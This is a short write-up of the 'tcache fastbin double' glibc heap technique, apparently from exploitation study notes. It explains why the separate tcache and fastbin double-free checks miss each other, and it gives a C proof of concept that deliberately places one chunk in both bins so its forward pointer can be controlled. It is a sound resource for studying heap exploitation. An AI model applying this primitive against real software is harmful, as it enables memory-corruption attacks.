## tcache fastbin double

**Purpose**: We can have 2 same chunk in both tcache and fastbin. This can be used to bypass both fastbin & tcache double free checks.

**More details**:

- tcache double free check: check the `tcache key` of the chunk being freed with the `tcache key` of all chunks in the tcache bin. If any of them matches, abort.

- fastbin double free check: if the chunk being freed is the same as the first chunk in the fastbin (head of fastbin), abort.

-> Take that advantage, the fastbin double free check cannot detect that a chunk has been inserted into the tcache and vice versa.

## PoC

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    void *chunks[8];

    for (int i = 0; i < 7; i++)
    {
        chunks[i] = malloc(0x10);
    }

    chunks[7] = malloc(0x10);

    for (int i = 0; i < 7; i++)
    {
        free(chunks[i]);
    }

    free(chunks[7]); // free normally to fastbin
    malloc(0x10); // take from tcache so that we have 1 free space in tcache
    /* VULN HERE */
    free(chunks[7]); // this time chunk is freed again to tcache
    /* VULN HERE */

    // now chunks[7] is in both tcache and fastbin
    // with this, on the next malloc(0x10), it will be taken from tcache
    // this time we can control the fd pointer of the fastbin chunk

    return 0;
}
```
